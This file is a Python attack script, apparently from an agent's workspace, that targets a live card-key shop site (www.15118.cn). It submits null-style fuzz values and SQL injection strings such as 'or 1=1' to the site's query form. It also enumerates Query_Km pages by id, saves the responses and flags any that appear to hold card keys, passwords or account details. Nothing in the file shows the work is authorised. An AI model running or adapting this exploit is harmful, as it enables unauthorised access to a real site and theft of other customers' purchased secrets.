#!/usr/bin/env python3
"""Retest YKFAKA Query.html value=null → Query_Km IDOR on 15118/2020999."""
from __future__ import annotations

import json
import re
import time
from pathlib import Path

import requests

BASE = "https://www.15118.cn"
OUT = Path("/workspace/2020999/results")
OUT.mkdir(parents=True, exist_ok=True)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36"


def main() -> None:
    s = requests.Session()
    s.headers.update(
        {
            "User-Agent": UA,
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Referer": BASE + "/Query.html",
        }
    )
    summary = []

    def token() -> str:
        r = s.get(BASE + "/Query.html", timeout=30)
        m = re.search(r'name="__token__"\s+value="([^"]+)"', r.text)
        if not m:
            raise RuntimeError("no token: " + r.text[:200])
        return m.group(1)

    vals = [
        "null",
        "NULL",
        "Null",
        "",
        "undefined",
        "None",
        "*",
        "%",
        "_",
        "1",
        "0",
        "true",
        "false",
        "[]",
        "{}",
        "or 1=1",
        "'or'1'='1",
    ]
    for val in vals:
        tok = token()
        data = {"value": val, "page": "1", "__token__": tok}
        t0 = time.time()
        try:
            r = s.post(BASE + "/Query.html", data=data, timeout=90)
            body = r.text
            code = r.status_code
        except Exception as e:
            summary.append({"value": val, "error": str(e)})
            print(f"value={val!r} ERR {e}", flush=True)
            continue
        elapsed = time.time() - t0
        safe = re.sub(r"[^a-zA-Z0-9]+", "_", val)[:40] or "empty"
        path = OUT / f"null_{safe}.html"
        path.write_text(body)
        kms = sorted(set(re.findall(r"Query_Km/[^\"'\s<>]+", body)))
        # also /Query_Km/{id} without .html
        kms2 = sorted(set(re.findall(r"/Query_Km/\d+", body)))
        rec = {
            "value": val,
            "http": code,
            "bytes": len(body),
            "elapsed": round(elapsed, 2),
            "km_links": len(kms),
            "km_paths": len(kms2),
            "sample": kms[:8],
            "title": (re.findall(r"<title>([^<]+)", body) or [""])[0],
        }
        summary.append(rec)
        print(
            f"value={val!r} http={code} bytes={len(body)} km={len(kms)} "
            f"t={elapsed:.1f}s sample={kms[:3]}",
            flush=True,
        )

    # GET probes
    for url in [
        BASE + "/Query.html?value=null&page=1",
        BASE + "/Query.html?value=null",
        BASE + "/Gd_Query.html",
    ]:
        r = s.get(url, timeout=30)
        kms = sorted(set(re.findall(r"Query_Km/[^\"'\s<>]+", r.text)))
        print(f"GET {url.split('cn')[-1]} http={r.status_code} bytes={len(r.text)} km={len(kms)}")
        summary.append(
            {"get": url, "http": r.status_code, "bytes": len(r.text), "km_links": len(kms)}
        )

    # sample Query_Km pages from archive ids if null failed
    for kid in ["1", "100", "904", "1000"]:
        r = s.get(f"{BASE}/Query_Km/{kid}.html", timeout=20)
        (OUT / f"Query_Km_{kid}.html").write_text(r.text)
        has_card = any(x in r.text for x in ("卡密", "kami", "密码", "账号", "-----"))
        print(
            f"Query_Km/{kid} http={r.status_code} bytes={len(r.text)} "
            f"cardish={has_card} title={(re.findall(r'<title>([^<]+)', r.text) or [''])[0]}",
            flush=True,
        )

    (OUT / "null_probe_summary.json").write_text(
        json.dumps(summary, ensure_ascii=False, indent=2)
    )
    print("DONE", OUT / "null_probe_summary.json")


if __name__ == "__main__":
    main()
